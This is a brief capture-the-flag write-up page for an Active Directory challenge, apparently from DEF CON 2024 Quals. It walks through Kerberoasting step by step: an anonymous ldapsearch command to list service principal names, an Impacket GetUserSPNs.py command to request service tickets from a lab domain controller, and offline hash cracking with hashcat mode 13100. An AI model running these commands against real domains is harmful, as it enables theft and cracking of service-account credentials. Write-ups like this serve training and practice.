---
layout: page
title: "Kerberoast-Showdown - DEF CON 2024 Quals Writeup"
subtitle: "Read Active Directory SPNs without domain credentials by abusing unauthenticated LDAP queries, then execute Kerberoasting against target service accounts."
permalink: /ctf/writeups/challenges/active-directory/kerberoast-showdown/
category: "active-directory"
challenge_name: "Kerberoast-Showdown"
difficulty: "Medium"
event: "DEF CON 2024 Quals"
points: "300"
solves: "110"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: DEF CON 2024 Quals
* **Difficulty**: Medium
* **Points**: 300
* **Solves**: 110
* **Category**: Active Directory
* **Tags**: Kerberoasting, LDAP Query, SPN, Impacket

---

## 📝 Description
Read Active Directory SPNs without domain credentials by abusing unauthenticated LDAP queries, then execute Kerberoasting against target service accounts.

---

## 💡 Solution / Approach
1. Use anonymous LDAP search queries to find SPNs: `ldapsearch -x -h 10.10.12.3 -b "dc=corp,dc=local" "(servicePrincipalName=*)" spn`.

2. Request Kerberos TGS tickets for identified accounts: `GetUserSPNs.py corp.local/guest:password -dc-ip 10.10.12.3 -request`.

3. Export the ticket hashes to a local file and crack offline using hashcat mode 13100.
